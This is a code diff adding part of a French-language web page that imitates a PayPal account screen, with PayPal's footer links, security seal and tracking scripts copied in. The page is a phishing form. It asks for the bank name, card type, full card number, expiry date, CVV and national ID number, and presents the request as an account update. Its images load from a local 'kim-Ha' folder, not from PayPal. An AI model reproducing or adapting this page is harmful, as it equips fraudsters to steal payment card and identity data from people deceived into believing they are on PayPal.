+                                    <option value="TN">Tunisie</option>
+                                    <option value="TM">Turkménistan</option>
+                                    <option value="TC">Turks-et-Caïques, Iles</option>
+                                    <option value="TR">Turquie</option>
+                                    <option value="TV">Tuvalu</option>
+                                    <option value="UA">Ukraine</option>
+                                    <option value="UY">Uruguay</option>
+                                    <option value="VU">Vanuatu</option>
+                                    <option value="VE">Venezuela</option>
+                                    <option value="VN">Vietnam</option>
+                                    <option value="YE">Yémen</option>
+                                    <option value="ZM">Zambie</option>
+                                    <option value="ZW">Zimbabwe</option>
+                                  </select></td>
+                              </tr>
+                              <tr>
+                                <td class="label" valign="middle"><label for="password">Nom de la banque&nbsp;:</label></td>
+                                <td width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td align="left" valign="bottom"><input id="address4" size="40" maxlength="100" class="smallInputWidth" name="bank" value="" type="text">
+                                  <br></td>
+                              </tr>
+                              <tr>
+                                <td class="label" valign="middle"><label for="retype_password">Type De Carte&nbsp;:</label></td>
+                                <td width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td align="left" valign="bottom"><SELECT id=type 
+
+                          name=type>
+                                  <option value="Visa">Visa</option>
+                                  <option value="MasterCard">MasterCard</option>
+                                  <option value="Carte Bleue">Carte Bleue</option>
+                                </SELECT>
+                                  <img src="kim-Ha/logo_ccVisa.gif" width="37" height="23"><img src="kim-Ha/logo_ccMC.gif" width="37" height="23"><img src="kim-Ha/PayPal_mark_37x23.gif" width="37" height="23"></td>
+                              </tr>
+                            </tbody>
+                          </table>
+                        <table class="formTable" align="center" border="0" cellpadding="0" cellspacing="0">
+                            <tbody>
+                              <tr>
+                                <td class="topSpacer" width="190"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="190"></td>
+                                <td class="topSpacer" width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td class="topSpacer" width="100%"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="1"></td>
+                              </tr>
+                              <tr>
+                                <td class="label" valign="middle"><label for="question1">Numèro De Carte De Credit :</label></td>
+                                <td width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td align="left" valign="bottom"><input type="text" id="numero" size="12" maxlength="16" class="smallInputWidth" name="numero" value="">
+                                  <br></td>
+                              </tr>
+                              <tr>
+                                <td class="label" valign="middle"><label for="answer1">Date d'expiration  :</label></td>
+                                <td width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td align="left" valign="bottom"><select id=expdate_month2 
+
+                          name=expdate_month>
+                                  <option value="0" selected>--</option>
+                                  <option value="1">1</option>
+                                  <option value="2">2</option>
+                                  <option value="3">3</option>
+                                  <option value="4">4</option>
+                                  <option value="5">5</option>
+                                  <option value="6">6</option>
+                                  <option value="7">7</option>
+                                  <option value="8">8</option>
+                                  <option value="9">9</option>
+                                  <option value="10">10</option>
+                                  <option value="11">11</option>
+                                  <option value="12">12</option>
+                                </select>
+                                <SELECT name=expdate_year>
+                                    <option value="2009">2008</option>
+                                    <option value="2009">2009</option>
+                                    <option value="2010">2010</option>
+                                    <option value="2011">2011</option>
+                                    <option value="2012">2012</option>
+                                    <option value="2013">2013</option>
+                                    <option value="2014">2014</option>
+                                    <option value="2015">2015</option>
+                                    <option value="2016">2016</option>
+                                    <option value="2017">2017</option>
+                                    <option value="2018">2018</option>
+                                    <option value="2019">2019</option>
+                                    <option value="2020">2020</option>
+                                  </SELECT></td>
+                              </tr>
+                              <tr>
+                                <td class="label" valign="middle"><label for="question2">Cryptogramme visuel :</label></td>
+                                <td width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td align="left" valign="bottom"><span class="small">
+                                  <input id=pin2 maxlength=3 size=4  
+
+                        name=cvv>
+                                </span></td>
+                              </tr>
+                              <tr>
+                                <td class="label" valign="middle"><label for="answer2">Numèro de CIN :<br>
+                                  <span class="small">(Carte d'Identité Nationale)</span></label></td>
+                                <td width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td align="left" valign="bottom"><input id="city2" size="25" maxlength="40" class="smallInputWidth" name="cin" value="" type="text"></td>
+                              </tr>
+                            </tbody>
+                          </table>
+                        <table class="formTable" align="center" border="0" cellpadding="0" cellspacing="0">
+                            <tbody>
+                              <tr>
+                                <td class="topSpacer" width="190"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="190"></td>
+                                <td class="topSpacer" width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td class="topSpacer" width="100%"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="1"></td>
+                              </tr>
+                              <tr>
+                                <td class="label" valign="middle"><label for="string_answer">Saisir les caractères&nbsp;:<br>
+                                      <span class="small">(non sensible à la hauteur de casse)</span></label></td>
+                                <td width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td align="left" valign="bottom"><table align="left" border="0" cellpadding="0" cellspacing="0">
+                                    <tbody>
+                                      <tr>
+                                        <td align="left"><input id="string_answer" size="12" maxlength="5" class="smallInputWidth" name="string_answer" value="" type="text"></td>
+                                        <td align="left"></td>
+                                      </tr>
+                                    </tbody>
+                                  </table>
+                                    <img src="kim-Ha/secret.jpg" alt="" border="1"><a target="_blank" href="https://www.paypal.com/cgi-bin/wv_web/on3N0F0g9IVkQQoHaQlvd8TSHrQZGsxYrXBE4Z4PfbKsx2L7lrVxeTolElpDuiNVB11wBw/secret.wav" onclick="openWindowATC('https://www.paypal.com/cgi-bin/wv_web/on3N0F0g9IVkQQoHaQlvd8TSHrQZGsxYrXBE4Z4PfbKsx2L7lrVxeTolElpDuiNVB11wBw/secret.wav','','450','350','', windowNamer('https://www.paypal.com/cgi-bin/wv_web/on3N0F0g9IVkQQoHaQlvd8TSHrQZGsxYrXBE4Z4PfbKsx2L7lrVxeTolElpDuiNVB11wBw/secret.wav'));return false;"><img src="kim-Ha/icon_hearing_14x13.gif" alt="" title="Ecouter" border="0"></a><br>
+                                    <span class="botspan bottomspan"><a target="_blank" href="https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/popup_random_access_key-outside" onclick="openWindowATC('https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/popup_random_access_key-outside','','450','350','', windowNamer('https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/popup_random_access_key-outside'));return false;">Besoin d'aide ?</a></span> </td>
+                              </tr>
+                            </tbody>
+                          </table>
+                        <p>&nbsp;</p>
+                        <div class="terms">
+                          
+                          <div align="center">
+                            <input name="next.x" type="submit" class="activeEmphasis" value=" J'accepte. Mettre à Jour mon compte.">
+                            </div>
+                        </div>
+                        <input name="form_charset2" value="UTF-8" type="hidden">
+                      </form></td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+              <p>&nbsp;</p>
+            </div></td>
+      </tr>
+      <tr>
+        <td><img alt="" border="0" height="4" src="https://www.paypalobjects.com//en_US/i/scr/pixel.gif" width="1"></td>
+      </tr>
+    </table>
+  </div>
+</div></td>
+</tr></table></td></tr>
+</table></div>
+<div id="footer" class="srd">
+<h5 class="accessAid">Plus d'informations</h5>
+<ul>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/cps/mobile/MobileOverview">Mobile</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_batch-payment-overview">Paiements groupés</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_upgrade-interest-marcom">Compte sur livret PayPal</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_dc-intro">Carte de débit</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_web-referrals-mrb">Parrainages</a></li>
+<li><a href="http://www.paypal-media.com/aboutus.cfm">Notre société</a></li>
+
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/cps/general/PayPalAccountTypes">
+Comptes</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_display-fees">Tarifs</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy">Respect de la vie privée</a></li>
+<li><a href="https://ad.doubleclick.net/clk;30045328;11466062;u?https://www.paypal.com/us/cgi-bin/webscr?cmd=_ppcredit-marketing&amp;channel=1&amp;promo=500">Carte Plus</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_security-center">Espace Sécurité</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/helpscr?cmd=_help&amp;t=escalateTab">Service clientèle</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/ua/ua">Contrats légaux</a></li>
+<li><a href="/developer">Développeurs</a></li>
+
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_shop">Boutiques</a></li>
+<li class="last">
+<!-- OnlineOpinionF3cS v3.0
+The following code is Copyright 1998-2006 Opinionlab, Inc.
+All rights reserved. Unauthorized use is prohibited.
+This product and other products of OpinionLab, Inc. are protected by U.S. Patent No. US 6606581, 6421724, 6785717 B1 and other patents pending.
+http://www.opinionlab.com-->
+<script type="text/javascript" src="https://www.paypalobjects.com//js/opinionlab/oo_engine.js"></script><script type="text/javascript">
+			var feedback_link='Evaluation du site';
+            	O_GoT(feedback_link);
+             	custom_var='Personal|Account Overview|US|fr_XC';_lG='fr_XC';_sp='%3A\\/\\/';_rp='%3A//'+_lG;</script>
+</li>
+</ul>
+<p id="footerSecure"><script type="text/javascript">var lang = 'en';var baseUrl ='https://seal.verisign.com/splash?form_file=fdf\/splash.fdf&dn=SCGI.EBAY.COM&lang='+lang;document.write ('<a href=\"'+baseUrl+'\" onclick=\"PAYPAL1.util.openWind(event,\{location:1,status:1,resizable:1,scrollbars:1,width:560,height:500\})\">');var ver = -1;var v_ua = navigator.userAgent.toLowerCase();if (v_ua.match(/msie ([0-9]{1,}[\.0-9]{0,})/) != null){ver = parseFloat( RegExp.$1 );}if((v_ua.indexOf("msie")!=-1) && (ver>=7)) {var plat=-1;if (v_ua.match(/windows nt ([0-9]{1,}[\.0-9]{0,})/) != null){plat = parseFloat( RegExp.$1 );}if (plat >= 5.1) {document.write("<img src='https://extended-validation-ssl.verisign.com/dot_clear.gif' style='display: none;' />");}}</script><img border="0" src="https://www.paypalobjects.com//fr_XC/i/logo/verisign.gif" alt=""><script type="text/javascript">document.write ('<\/a>');</script><p><a target="_blank" href="http://www.verisign.com/ssl-certificate">A propos des certificats SSL</a></p></p>
+<p id="legal">Copyright © 1999-2008 PayPal. Tous droits réservés.<br><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/UserAgreement/general/FDIC">Informations sur l'assurance de compte via FDIC</a><br></p>
+</div>
+
+<div id="navFull"><ul>
+<li class="active">
+<a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_account&amp;nav=0" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:RO');">Mon compte</a><ul>
+<li class="active"><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_account&amp;nav=0.0" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:RP');">Aperçu du compte</a></li>
+<li>
+<a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_add-funds&amp;nav=0.1" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:RQ');">Ajouter des fonds</a><ul><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_add-funds-bank&amp;origination=_add-funds-bank&amp;ach_country_code=US&amp;nav=0.1.0" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:FA');">Ajouter des fonds à partir d'un compte bancaire</a></li></ul>
+</li>
+<li>
+<a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_withdraw-funds&amp;nav=0.2" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:RR');">Virer</a><ul>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_withdraw-funds-bank&amp;nav=0.2.0" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:RS');">Transférer des fonds vers un compte bancaire</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_withdraw-funds-check&amp;nav=0.2.1" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:RT');">Demander un chèque</a></li>
+
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_dc-intro&amp;nav=0.2.2" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:RU');">Utiliser une carte de débit</a></li>
+</ul>
+</li>
+<li>
+<a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_history&amp;nav=0.3" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:RV');">Historique</a><ul>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_history&amp;nav=0.3.0" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:RW');">Recherche de base</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_history-download&amp;nav=0.3.1" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:RY');">Télécharger l'historique</a></li>
+</ul>
+</li>
+<li>
+<a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_complaint-view&amp;nav=0.4" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:SC');">Gestionnaire de litiges</a><ul>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_complaint-view&amp;nav=0.4.0" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:SD');">Visualiser les dossiers en cours</a></li>
+
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/CaseManagement/customerservice/EducationModuleIndex&amp;nav=0.4.1" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:SF');">Didacticiels</a></li>
+</ul>
+</li>
+<li>
+<a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-summary&amp;nav=0.5" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:SN');">Préférences</a><ul>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-email&amp;nav=0.5.0" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:SO');">Ajouter ou modifier une adresse email</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-ach&amp;nav=0.5.1" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:SP');">Enregistrer ou modifier un compte bancaire</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-credit-card-new-clickthru&amp;flag_from_account_summary=1&amp;nav=0.5.2" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:SQ');">Enregistrer ou modifier une carte de crédit</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-address&amp;nav=0.5.3" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:SR');">Ajouter ou modifier une adresse postale</a></li>
+</ul>
+</li>
+
+</ul>
+</li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money&amp;nav=1" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:TZ');">Paiement</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_request-money&amp;nav=2" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:UC');">Demande de paiement</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_merchant&amp;nav=3" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:UF');">Solutions e-commerce</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_auction&amp;nav=4" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:UG');">Solutions eBay</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/Marketing/general/ProductsandServices&amp;nav=5" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:UH');">Produits et services</a></li>
+</ul></div>
+<script type="text/javascript">
+							  // This is an ugly hack until there is a reliable ondomready function
+							 if(typeof PAYPAL != 'undefined'){
+								 PAYPAL.core.Navigation.init();
+							}</script>
+<!-- SiteCatalyst Code
+Copyright 1997-2005 Omniture, Inc.
+More info available at http://www.omniture.com -->
+
+<script type="text/javascript" src="https://www.paypalobjects.com//js/site_catalyst/pp_jscode_080706.js"></script>
+<script type="text/javascript">
+<!--
+/* SiteCatalyst Variables */
+s.prop1="p/acc/index";
+s.prop6="6FU66772RF501733T";
+s.prop7="Personal";
+s.prop8="Unverified";
+s.prop9="Restricted";
+s.prop10="US";
+s.prop34="SRD User";
+s.pageName="Account Overview";
+s.channel="Account Overview";
+s.prop50="fr_XC";
+s.prop18="";
+/************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
+var s_code=s.t();if(s_code)document.write(s_code)//--></script>
+<script type="text/javascript"><!--
+if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
+//-->
+</script><noscript><img
+src="//paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript"
+height="1" width="1" border="0" alt="" /></noscript>
+<!--/DO NOT REMOVE/-->
+
+<!-- End SiteCatalyst Code -->
+</body>
+</html>
